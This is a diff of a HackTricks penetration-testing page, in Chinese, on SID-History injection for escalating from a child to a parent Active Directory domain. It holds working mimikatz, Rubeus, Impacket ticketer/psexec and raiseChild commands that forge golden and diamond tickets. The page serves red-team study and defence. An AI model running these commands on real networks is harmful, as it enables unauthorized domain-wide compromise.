@@ -1,32 +1,35 @@
 # SID-History Injection
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载PDF格式的HackTricks**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## SID History Injection 攻击
+## SID 历史注入攻击
 
-**SID History Injection 攻击**的重点是在**用户在域之间迁移**时，确保他们可以继续访问来自以前域的资源。这是通过将用户以前的安全标识符（SID）合并到其新帐户的SID History中来实现的。值得注意的是，通过将父域中高特权组（例如企业管理员或域管理员）的SID添加到SID History中，可以操纵此过程以授予未经授权的访问权限。这种利用赋予对父域内所有资源的访问权限。
+**SID 历史注入攻击**的重点是帮助**用户在域之间迁移**，同时确保继续访问前一个域的资源。这是通过**将用户之前的安全标识符 (SID) 纳入其新账户的 SID 历史**来实现的。值得注意的是，这一过程可以被操控，通过将来自父域的高权限组（如企业管理员或域管理员）的 SID 添加到 SID 历史中，从而授予未经授权的访问。这种利用赋予了对父域内所有资源的访问权限。
 
-有两种方法可用于执行此攻击：通过创建**Golden Ticket**或**Diamond Ticket**。
+执行此攻击有两种方法：通过创建**金票**或**钻石票**。
 
-要找到**"Enterprise Admins"**组的SID，首先必须找到根域的SID。在确定后，可以通过在根域的SID后附加`-519`来构建Enterprise Admins组的SID。例如，如果根域SID为`S-1-5-21-280534878-1496970234-700767426`，则"Enterprise Admins"组的结果SID将是`S-1-5-21-280534878-1496970234-700767426-519`。
+要确定**“企业管理员”**组的 SID，首先必须找到根域的 SID。在识别后，可以通过将 `-519` 附加到根域的 SID 来构建企业管理员组的 SID。例如，如果根域 SID 为 `S-1-5-21-280534878-1496970234-700767426`，则“企业管理员”组的结果 SID 将为 `S-1-5-21-280534878-1496970234-700767426-519`。
 
-您还可以使用**Domain Admins**组，其以**512**结尾。
+您还可以使用**域管理员**组，其 SID 以**512**结尾。
 
-另一种找到其他域组的SID（例如"Domain Admins"）的方法是：
+找到其他域（例如“域管理员”）组的 SID 的另一种方法是：
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-### 使用KRBTGT-AES256的黄金票据（Mimikatz）
+### Golden Ticket (Mimikatz) with KRBTGT-AES256
 
 {% code overflow="wrap" %}
 ```bash
@@ -47,13 +50,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 {% endcode %}
 
-有关黄金票据的更多信息，请查看：
+有关黄金票证的更多信息，请查看：
 
 {% content-ref url="golden-ticket.md" %}
 [golden-ticket.md](golden-ticket.md)
 {% endcontent-ref %}
 
-### 钻石票据（Rubeus + KRBTGT-AES256）
+### 钻石票证 (Rubeus + KRBTGT-AES256)
 
 {% code overflow="wrap" %}
 ```powershell
@@ -67,13 +70,13 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-有关钻石票的更多信息，请查看：
+有关 diamond tickets 的更多信息，请查看：
 
 {% content-ref url="diamond-ticket.md" %}
 [diamond-ticket.md](diamond-ticket.md)
 {% endcontent-ref %}
 
-{% endcode %}
+{% code overflow="wrap" %}
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
@@ -81,7 +84,9 @@ ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-使用受损域的KRBTGT哈希值升级为DA或根管理员或企业管理员：
+使用被攻陷域的 KRBTGT 哈希提升到根或企业管理员的权限：
+
+{% code overflow="wrap" %}
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -95,15 +100,15 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-通过攻击获得的权限，您可以在新域中执行例如DCSync攻击：
+通过攻击获得的权限，您可以在新域中执行例如 DCSync 攻击：
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### 从Linux
+### 从 Linux
 
-#### 使用[ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)手动操作
+#### 使用 [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) 手动操作
 
 {% code overflow="wrap" %}
 ```bash
@@ -127,36 +132,39 @@ psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.1
 ```
 {% endcode %}
 
-#### 使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) 进行自动化
+#### 自动使用 [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-这是一个 Impacket 脚本，可以**自动将权限从子域升级到父域**。脚本需要：
+这是一个 Impacket 脚本，它将 **自动从子域提升到父域**。该脚本需要：
 
 * 目标域控制器
-* 子域中管理员用户的凭证
+* 子域中管理员用户的凭据
 
 流程如下：
 
-* 获取父域的 Enterprise Admins 组的 SID
-* 检索子域中 KRBTGT 账户的哈希值
-* 创建一个 Golden Ticket
+* 获取父域的企业管理员组的 SID
+* 检索子域中 KRBTGT 账户的哈希
+* 创建一个黄金票证
 * 登录到父域
-* 检索父域中管理员账户的凭证
-* 如果指定了 `target-exec` 开关，则通过 Psexec 认证到父域的域控制器。
+* 检索父域中管理员账户的凭据
+* 如果指定了 `target-exec` 开关，它将通过 Psexec 认证到父域的域控制器。
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## 参考资料
+## 参考文献
 * [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 * [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
+{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
+<summary>支持 HackTricks</summary>
 
-* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中做广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 **上关注我们** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
+{% endhint %}
